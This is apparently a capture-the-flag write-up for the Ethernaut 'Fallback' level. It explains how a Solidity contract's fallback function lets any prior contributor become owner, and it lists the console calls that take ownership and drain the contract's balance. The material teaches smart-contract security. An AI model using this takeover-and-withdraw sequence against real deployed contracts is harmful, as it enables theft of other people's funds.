# Fallback

Look carefully at the contract's code below.<br/>
You will beat this level if: <br/>

- you claim ownership of the contract<br/>
- you reduce its balance to 0<br/>

Vulnerability on in this challenge allow anyone who execute fallback function to be owner of the contract and withdraw all of the contract balance.<br/>
It checks only amount of contribution of sender (person who execute that function) and msg.value that we paid is more than zero to be owner.<br/>

From the condition to be owner in the fallback function:
```javascript
require(msg.value > 0 && contributions[msg.sender] > 0);
```

We need to have balance in the contributions first and then pay money to the fallback to pass it.
```javascript
await contract.contribute({ value: toWei('0.0001') }); //in contribute() have require(msg.value < 0.001 ether);
```

Then, send ether to trigger fallback receive function:
```javascript
contract.send(toWei('0.0001'));
```
Check the owner is our player address:
```javascript
await contract.owner();
```

Withdraw all funcs and check the contract is no balance left:
```javascript
await contract.withdraw();
await web3.eth.getBalance(instance);
> '0'
```